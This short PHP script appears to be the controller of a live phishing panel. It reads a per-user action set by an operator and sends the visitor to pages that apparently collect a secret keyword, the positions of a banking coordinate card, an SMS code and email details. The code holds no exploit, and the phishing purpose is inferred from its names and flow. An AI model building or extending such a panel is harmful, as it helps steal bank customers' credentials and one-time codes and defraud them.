<?php
session_start();

$usuario = $_SESSION['usuario'] ?? null;

if (!$usuario) exit;

$accion = $_SESSION["accion_$usuario"] ?? null;

if ($accion) {
    unset($_SESSION["accion_$usuario"]); // solo una vez

    if (str_starts_with($accion, "/palabra clave/")) {
        $_SESSION['pregunta'] = explode("/palabra clave/", $accion)[1];
        header("Location: pregunta.php");
        exit;
    }

    if (str_starts_with($accion, "/coordenadas etiquetas/")) {
        $_SESSION['etiquetas'] = explode(",", explode("/coordenadas etiquetas/", $accion)[1]);
        header("Location: coordenadas.php");
        exit;
    }

    if ($accion === "/SMS") {
        header("Location: sms.php");
        exit;
    }

    if ($accion === "/CORREO") {
        header("Location: correo.php");
        exit;
    }
}
?>
